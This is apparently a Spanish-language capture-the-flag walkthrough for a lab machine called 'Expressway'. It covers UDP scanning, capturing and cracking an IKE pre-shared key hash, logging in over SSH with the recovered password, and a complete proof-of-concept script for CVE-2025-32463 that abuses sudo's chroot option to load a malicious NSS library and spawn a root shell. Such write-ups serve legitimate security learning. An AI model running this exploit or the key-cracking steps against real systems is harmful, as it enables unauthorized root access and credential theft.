# Expressway

importante destacar que no era posible escanear el puerto 500 que es el que realmente estaba activo si no le pasabas el parametro de UDP a nmap,

```
nmap -sU <ip>
```

descubriamos el puerto 500 abierto

podiamos hacer un ataque de fuerza bruta a ike

```
ike-scan -A --pskcrack 10.10.11.87                                     
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=70c8b561e1743715) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
1b15f733714f775fda5fc95e3d3a1ed653f3a2e0d95388e5d00be9110f95ea8ebb8230896fa65238c7121859be7aa63d9a7e3313b2a99685c37a6a02ffc9a05cbbad0bd36be43690be222717e5e3e2a3cbb4aa02e16ec017a9d4b3482bbe374b931ed3dd0650477e0996ab943d8abd4619d01b439012ae3d83c194a57bf85416:71d8c0b36bbb81d5167d793bfcb936704c0cc68499d3d7d0407c931205f3aeb1693dc8bc44daebb604815c1042250fc8dc6e70ddede91cf8644721268f8e8d5027e456fd77ce781f655718407bd33340874da62219992daeb558c1d58be9ad1b9e08f6d4fddb421f9f81b11db4b45fe613938d8d4c6660ca82eeeb7f1a5881c1:70c8b561e1743715:0d25f6a62e15b027:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:c3fd9f092b7ad2bd05bb4fa22debd4344105d7c2:3c06d72fadb9e794d2bdc9814d1679dd482b5c03c9a07bbf0b79768ce2618c9a:226e1473c63579f363774f93f0cb31c6170f5f0a
Ending ike-scan 1.9.6: 1 hosts scanned in 0.150 seconds (6.67 hosts/sec).  1 returned handshake; 0 returned notify

```

y nos daba el usuario ike y el dominio y la contraseña con un hash la cual hemos crackeado con

```
psk-crack hash.txt --dictionary=/usr/share/wordlists/rockyou.txt
```

posteriormente nos hemos conectado por ssh con la contraseña

```
"freakingrockstarontheroad"
```

posteriormente la escalada de privilegios era dada porque sudo no se encontraba en la version mas reciente

```
searchsploit sudo 1.9.17 
```

y simplemente ejecutando este script nos daba acceso como root

```
sudo --version
```

```
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF

# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
```
